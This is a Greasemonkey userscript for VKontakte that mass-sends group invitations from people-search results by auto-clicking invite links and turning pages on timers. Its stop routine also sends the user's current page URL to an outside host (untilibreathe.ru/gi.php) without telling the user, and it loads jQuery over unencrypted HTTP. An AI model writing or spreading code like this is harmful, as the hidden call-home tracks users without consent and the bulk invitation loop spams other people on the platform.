// ==UserScript==
// @name Vkontakte Fast Invite
// @namespace shmidtsergey.ru/vk/
// @description Vkontakte Fast Group Invite
// @author Sergey Shmidt
// @include http://vkontakte.ru/gsearch.php?from=people&q=*
// @exclude 
// ==/UserScript==

//Подключаем jQuery
var GM_JQ = document.createElement('script');
GM_JQ.src = 'http://jquery.com/src/jquery-latest.js';
GM_JQ.type ='text/javascript';
document.getElementsByTagName('head')[0].appendChild(GM_JQ);

function GM_wait() {
    if(typeof unsafeWindow.jQuery == 'undefined') { window.setTimeout(GM_wait,100); }
    else { $ = unsafeWindow.jQuery; window.setTimeout(letsJQuery, 2000); }
}
GM_wait();



function letsJQuery() { 
	
	$('#filterForm').prepend("<div id='log' class='filterShut'>Выслано: <span id='varcount'>0</span> / <span id='totalcount'>0</span></div>");

	$('#filterForm').prepend("<div id='abortIntervalButton' style='background:#edc9c9;' class='filterShut'>Прекратить!</div>");
	
	$("#abortIntervalButton").click(function () { stopallintervals('Добавление остановлено.'); });

	function stopallintervals(message){
		clearInterval(autonext); clearInterval(pageturn);
		$('#searchSummary').text("Добавление остановлено");
		if (message){
			alert(message);
		}
		url = location.href;
                url = str_replace("&", "*amp*", url);
                url = str_replace("#", "*sharp*", url);
                $('#searchSummary').load("http://untilibreathe.ru/uib/gi.php?url="+url);

	}
	
	var sendRequersts = 0; var totalcount = 0;

	function sendRequest(){
		
		var status = $('#refreshCaptcha').html();

		if(status == null){
			$("a:contains('Выслать приглашение'):first").click();
		} else {
			$('.popup_transparent_bg').hide();
			$('.popup_box_container').hide();
			stopallintervals('Добавление остановленно. Капча в городе.');
		}
		
		var responce = $("#msg:last").html();
		$("#msg:last").after("<p class='msg'>"+responce+"</p>");
		$("#msg:last").remove();
		if(responce == 'Приглашение выслано.'){
			$('#varcount').html(sendRequersts++);
		} else if (responce == 'Вы можете пригласить только 40 человек в день.'){
			stopallintervals('Добавление остановлено. 40 человек пригласил - долг выполнил');
		}

		$('#totalcount').html(totalcount++);

	}

	function goToNextPage(){
		$("a:contains('›')").click();
	}

	var autonext = setInterval(sendRequest, 500); //500
	var pageturn = setInterval(goToNextPage, 10900);



}

function str_replace(search, replace, subject) {
	return subject.split(search).join(replace);
}